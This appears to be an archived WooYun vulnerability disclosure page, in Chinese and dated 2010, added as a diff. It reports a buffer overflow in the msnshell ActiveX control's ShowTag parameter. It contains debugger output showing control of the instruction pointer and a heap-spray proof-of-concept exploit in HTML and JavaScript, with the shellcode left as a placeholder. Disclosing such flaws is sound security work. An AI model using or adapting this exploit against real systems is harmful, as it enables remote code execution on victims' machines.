@@ -1,0 +1,248 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		msnshell远程代码执行漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		msnshell远程代码执行漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/疯狗">疯狗</a> 
+</li><li>提交时间：		2010-09-17 20:01</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2010-09-17：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2010-09-18：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">msnshell是国内一款多功能的msn辅助工具，有着方便而强大聊天加密功能，使其用户群非常广泛，但是该应用有一些已存在多年的远程代码执行漏洞。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">问题出在msnshell的activex控件上<br />
+<br />
+ClassID : 20FD1EBC-A607-4C18-9F18-0233EF4D7234<br />
+<br />
+File : MSNShellSDK.dll<br />
+<br />
+<br />
+<br />
+ShowTag以及其他部分参数对数据长度的过滤不足，当长度为540字节左右的时候造成缓冲区溢出，控制程序流程。<br />
+<br />
+<br />
+<br />
+PS:不只是这一个参数有漏洞！<br />
+<br />
+<br />
+<br />
+</p><pre><code>7C923297    FF75 14         push    dword ptr [ebp+14]<br />
+7C92329A    FF75 10         push    dword ptr [ebp+10]<br />
+7C92329D    FF75 0C         push    dword ptr [ebp+C]<br />
+7C9232A0    FF75 08         push    dword ptr [ebp+8]<br />
+7C9232A3    8B4D 18         mov     ecx, dword ptr [ebp+18]<br />
+7C9232A6    FFD1            call    ecx   &lt;-- exploit it!<br />
+7C9232A8    64:8B25 0000000&gt;mov     esp, dword ptr fs:[0]<br />
+7C9232AF    64:8F05 0000000&gt;pop     dword ptr fs:[0]<br />
+7C9232B6    8BE5            mov     esp, ebp<br />
+7C9232B8    5D              pop     ebp<br />
+7C9232B9    C2 1400         retn    14<br />
+<br />
+eax=7ffd3000 ebx=00000001 ecx=00000002 edx=00000003 esi=00000004 edi=00000005<br />
+eip=7c92120e esp=0118ffcc ebp=0118fff4 iopl=0         nv up ei pl zr na po nc<br />
+cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00000246<br />
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\W<br />
+INDOWS\system32\ntdll.dll -<br />
+ntdll!DbgBreakPoint:<br />
+7c92120e cc               int     3<br />
+0:007&gt; g<br />
+url:ModLoad: 753b0000 75421000   C:\WINDOWS\system32\mshtmled.dll<br />
+url:ModLoad: 76320000 76367000   C:\WINDOWS\system32\comdlg32.dll<br />
+ModLoad: 76960000 76984000   C:\WINDOWS\system32\ntshrui.dll<br />
+ModLoad: 76af0000 76b01000   C:\WINDOWS\system32\ATL.DLL<br />
+ModLoad: 759d0000 75a7f000   C:\WINDOWS\system32\USERENV.dll<br />
+ModLoad: 76950000 76958000   C:\WINDOWS\system32\LINKINFO.dll<br />
+url:ModLoad: 76b10000 76b3a000   C:\WINDOWS\system32\WINMM.dll<br />
+ModLoad: 5dba0000 5dba8000   C:\WINDOWS\system32\rdpsnd.dll<br />
+ModLoad: 762d0000 762e0000   C:\WINDOWS\system32\WINSTA.dll<br />
+ModLoad: 76f20000 76f28000   C:\WINDOWS\system32\Wtsapi32.dll<br />
+ModLoad: 72c80000 72c88000   C:\WINDOWS\system32\msacm32.drv<br />
+ModLoad: 77bb0000 77bc5000   C:\WINDOWS\system32\MSACM32.dll<br />
+ModLoad: 03070000 0311f000   C:\PROGRA~1\MSNShell\BIN\MSNSHE~1.DLL<br />
+ModLoad: 5efe0000 5eff7000   C:\WINDOWS\system32\olepro32.dll<br />
+ModLoad: 75bc0000 75c3d000   C:\WINDOWS\system32\JScript.dll<br />
+Access violation - code c0000005 (first chance)<br />
+eax=41414141 ebx=41414141 ecx=00000000 edx=41414141 esi=0012dfc8 edi=00000000<br />
+eip=030746b0 esp=0012dea8 ebp=0012e0d4 iopl=0         nv up ei pl nz na po nc<br />
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206<br />
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\P<br />
+ROGRA~1\MSNShell\BIN\MSNSHE~1.DLL -<br />
+MSNSHE~1+46b0:<br />
+030746b0 8b40fc           mov     eax,[eax-0x4]     ds:0023:4141413d=????????<br />
+0:000&gt; g<br />
+Access violation - code c0000005 (first chance)<br />
+eax=00000000 ebx=00000000 ecx=41414141 edx=7c9232bc esi=00000000 edi=00000000<br />
+eip=41414141 esp=0012dad8 ebp=0012daf8 iopl=0         nv up ei pl zr na po nc<br />
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246<br />
+41414141 ??               ???<br />
+0:000&gt; d eip<br />
+41414141  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????<br />
+41414151  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????<br />
+41414161  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????<br />
+41414171  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????<br />
+41414181  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????<br />
+41414191  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????<br />
+414141a1  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????<br />
+414141b1  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????<br />
+0:000&gt;</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/18114607c8f6ab1803313024c5dc31ab9b53e4a5.jpg" target="_blank"><img src="../images/18114607c8f6ab1803313024c5dc31ab9b53e4a5.jpg" alt="" width="600"/></a></p><p class="detail"> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">POC很简单，让程序call到0x0c0c0c0c去，使用堆喷射技术即可。<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;html&gt;<br />
+&lt;object classid=&quot;clsid:BFB06F62-190C-42F6-91B1-3CB03560FE2D&quot; id=&#039;target&#039;&gt;&lt;/object&gt;<br />
+&lt;body&gt;<br />
+&lt;SCRIPT language=&quot;JavaScript&quot;&gt;<br />
+var shellcode = unescape(&quot;you shellcode is here&quot;);<br />
+<br />
+var bigblock = unescape(&quot;%u0C0C%u0C0C&quot;);<br />
+var headersize = 20;<br />
+var slackspace = headersize+shellcode.length;<br />
+while (bigblock.length&lt;slackspace) bigblock+=bigblock;<br />
+fillblock = bigblock.substring(0, slackspace);<br />
+block = bigblock.substring(0, bigblock.length-slackspace);<br />
+while(block.length+slackspace&lt;0x40000) block = block+block+fillblock;<br />
+memory = new Array();<br />
+for (x=0; x&lt;350; x++) memory[x] = block +shellcode;<br />
+var buffer = &#039;&#039;;<br />
+while (buffer.length &lt; 540 ) buffer+=&#039;\x0C\x0C\x0C\x0C&#039;;<br />
+target.ShowTag(buffer);<br />
+&lt;/script&gt;<br />
+&lt;/body&gt;<br />
+&lt;/html&gt;</code></pre><p class='detail'> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">you know. </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/疯狗" title="疯狗">疯狗</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-0570" title="msnshell远程代码执行漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																<p class="detail">漏洞Rank：15 (WooYun评价)</p>
+												
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="570";
+var bugRating="2";
+var myRating="";
+var ratingCount="5";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
